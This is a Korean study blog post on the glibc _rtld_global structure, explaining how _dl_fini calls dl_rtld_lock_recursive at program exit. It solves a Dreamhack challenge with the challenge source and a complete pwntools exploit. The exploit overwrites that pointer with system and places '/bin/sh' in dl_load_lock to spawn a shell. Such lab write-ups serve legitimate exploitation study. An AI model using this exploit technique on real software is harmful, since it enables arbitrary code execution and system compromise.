---
title: "[PWNABLE] rtld global"
description: "rtld global프로그램이 실행되고 프로세스로 등록될 때, 코드와 변수들을 관리하기 위한 구조체이다.실행이 종료되는 지점에서 참조된다.return에 의해 종료될 때 확인이 가능하다. 간단한 실습 예제이다.#include int main(){ return 0; }바이너리 __stack부터 확인해보면 main함수 호츨을 "
date: "2024-06-24"
translation_key: "tistory-6887f7a3f117"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-rtld-global"
private: false
---

### rtld global

프로그램이 실행되고 프로세스로 등록될 때, 코드와 변수들을 관리하기 위한 구조체이다.

실행이 종료되는 지점에서 참조된다.

return에 의해 종료될 때 확인이 가능하다.

간단한 실습 예제이다.

```
#include <stdio.h>

int main(){
	return 0;
    }
```

![](/assets/images/tistory/tistory-6887f7a3f117/001.png)

바이너리 \_\_stack부터 확인해보면 main함수 호츨을 \_\_libc\_start\_main에서 하는 것을 알 수 있다.

즉, main함수가 종료될 때 복귀도는 주소도 \_\_libc\_start\_main이다.

여기서 step into로 계속 들어가보겠다.

![](/assets/images/tistory/tistory-6887f7a3f117/002.png)

조금 들어가다보면 \_\_GI\_exit라는 함수가 호출된다.

그리고 \_\_run\_exit\_handlers를 호출한다.

이제 여기서 함수 종료에 return을 쓰나 안쓰나에 따라 달라지는데,

이번 예제는 사용을 했기 때문에 \_dl\_fini라는 함수가 호출된다.

![](/assets/images/tistory/tistory-6887f7a3f117/003.png)

dreamhack 설명으로는 여기서 \_\_rtld\_lock\_lock\_recursive함수가 호출된다고 하는데 gdb로는 위 상태에서

\_\_GI\_\_exit함수로 갔다가 종료된다.

```
# define __rtld_lock_lock_recursive(NAME) \
  GL(dl_rtld_lock_recursive) (&(NAME).mutex)
  
void
_dl_fini (void)
{
#ifdef SHARED
  int do_audit = 0;
 again:
#endif
  for (Lmid_t ns = GL(dl_nns) - 1; ns >= 0; --ns)
    {
      /* Protect against concurrent loads and unloads.  */
      __rtld_lock_lock_recursive (GL(dl_load_lock));
```

\_\_di\_fini함수에서 dl\_load\_lock을 인자로 recursive함수를 호출한다.

 \_\_rtld\_lock\_lock\_recursive는 코드에서 매크로로 dl\_rtld\_lock\_recursive라는 함수 포인터로 사용된다.

해당 포인터는 \_rtld\_global 구조체의 맴버 변수라고 한다.

\_rtld\_global 변수에 대해 살펴보겠다.

![](/assets/images/tistory/tistory-6887f7a3f117/004.png)

상당히 긴 친구이다.

![](/assets/images/tistory/tistory-6887f7a3f117/005.png)

\_dl\_rtld\_lock\_recursive에 대한 정의이다.

![](/assets/images/tistory/tistory-6887f7a3f117/006.png)

실행중인 상태에서 봤을 때 rtld\_lock\_default\_lock\_recursive의 주소를 저장하고 있다.

해당 부분을 이용하여 메모리를 변조하면 공격이 가능하다.

* * *

dreamhack \_rtld\_global 문제

```
#include <stdio.h>
#include <stdlib.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int main() {
  long addr;
  long data;
  int idx;

  init();

  printf("stdout: %p\n", stdout);
  while (1) {
    printf("> ");
    scanf("%d", &idx);
    switch (idx) {
      case 1:
        printf("addr: ");
        scanf("%ld", &addr);
        printf("data: ");
        scanf("%ld", &data);
        *(long long *)addr = data;
        break;
      default:
        return 0;
    }
  }
  return 0;
}
```

문제 코드이다.

case 1인 경우에서 got overwrite 취약점이 발생하는 것을 볼 수 있다.

stdout의 주소를 leak해주기 때문에 해당 주소를 이용해서 libc\_base를 구할 수 있다.

patchelf 명령어로 사용하는 라이브러리를 패치해준다.

![](/assets/images/tistory/tistory-6887f7a3f117/007.png)

gdb로 확인해보면 정상적으로 바뀐 것을 볼 수있다.

![](/assets/images/tistory/tistory-6887f7a3f117/008.png)

기존 libc\_base와의 차이를 계산하면 0x3f1000이 나다

![](/assets/images/tistory/tistory-6887f7a3f117/009.png)

\_rtld\_global 주소 계산과정이다.

구조체 내 맴버 변수의 오프셋을 알아내려면 구조체와 멤버 변수 정보를 가지고 있는 디버깅 심볼이 필요하다.

![](/assets/images/tistory/tistory-6887f7a3f117/010.png)

glibc의 상세버젼은 2.27-3ubuntu1이다.

```
 wget http://launchpadlibrarian.net/365856914/libc6-dbg_2.27-3ubuntu1_amd64.deb
 
 dpkg -x libc6-dbg_2.27-3ubuntu1_amd64.deb ./
```

해당 버젼에 맞는 패키지를 다운받고 추출한다.

![](/assets/images/tistory/tistory-6887f7a3f117/011.png)

이제 맴버 변수의 오프셋을 구했으니 공격을 수행하면 된다.

전체 페이로드이다.

```
from pwn import*

p = process(['./ow_rtld'],env={'LD_PRELOAD':'./libc-2.27.so'})
e = ELF('./ow_rtld')
libc = ELF('./libc-2.27.so')
ld = ELF('./ld-2.27.so')

context.log_level='debug'

p.recvuntil(b": ")
stdout = int(p.recvn(14),16)
print("stdout@add : ",hex(stdout))

stdout_offset = libc.sym['_IO_2_1_stdout_']
libc_base = stdout - stdout_offset
print("libc_base@add : ", hex(libc_base))

ld_base = libc_base + 0x3f1000
print("ld_base@add : ", hex(ld_base))

rtld_global = ld_base + ld.sym['_rtld_global']
dl_load_lock = rtld_global + 2312
dl_rtld_lock_recursive = rtld_global + 3840

print("rtld_global@add : ",hex(rtld_global))
print("dl_load_lock@add : ",hex(dl_load_lock))
print("dl_rtld_lock_recursive@add : ",hex(dl_rtld_lock_recursive))

system_offset = libc.sym['system']
system = libc_base + system_offset

def send(add,val):
    p.sendlineafter(b'>',b'1')
    p.sendlineafter(b'addr: ',str(add))
    p.sendlineafter(b'data: ',str(val))

send(dl_load_lock, u64('/bin/sh\x00'))

send(dl_rtld_lock_recursive,system)

p.sendlineafter(b'> ',b'2')

p.interactive()
```

![](/assets/images/tistory/tistory-6887f7a3f117/012.png)
